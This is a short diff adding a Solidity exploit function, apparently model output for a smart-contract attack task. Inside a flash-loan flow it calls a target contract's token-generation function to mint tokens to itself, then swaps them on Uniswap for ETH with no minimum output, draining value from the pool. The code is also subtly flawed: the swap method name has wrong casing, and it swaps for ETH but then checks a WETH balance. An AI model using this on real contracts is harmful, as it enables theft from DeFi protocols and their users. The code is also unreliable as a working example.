@@ -1,0 +1,26 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+        // Flash loan received, we will now generate tokens.
+        ITouch(target).generateTokens(address(this), amount);
+        
+        // We will swap the tokens we just generated for WETH.
+        address[] memory path = new address[](2);
+        path[0] = address(valuableToken);
+        path[1] = address(uniswapRouter.WETH());
+
+        // Swap the tokens for WETH.
+        IUniswapV2Router(uniswapRouter).swapExactTokensForEth(
+            amount,
+            0, // Accept any amount of WETH for the tokens
+            path,
+            address(this),
+            block.timestamp
+        );
+        
+        // Verify the amount of WETH received
+        uint256 wethReceived = IWETH(uniswapRouter.WETH()).balanceOf(address(this));
+        console.log("WETH received: ", wethReceived);
+    }
+</executeExploitCode>
+```
